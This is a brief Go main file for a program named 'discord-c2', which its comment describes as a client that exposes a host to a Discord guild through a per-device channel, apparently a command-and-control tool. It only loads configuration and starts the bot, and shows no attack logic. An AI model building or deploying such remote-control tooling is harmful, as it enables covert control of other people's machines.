// Command discord-c2 is a Go client that exposes a host to a Discord guild
// through a per-device channel.
package main

import (
	"log"

	"discord-c2/internal/bot"
	"discord-c2/internal/config"
)

func main() {
	cfg, err := config.Load(embeddedEnv, ".env")
	if err != nil {
		log.Printf("%v", err)
		return
	}
	if err := bot.Run(cfg); err != nil {
		log.Printf("client stopped: %v", err)
	}
}
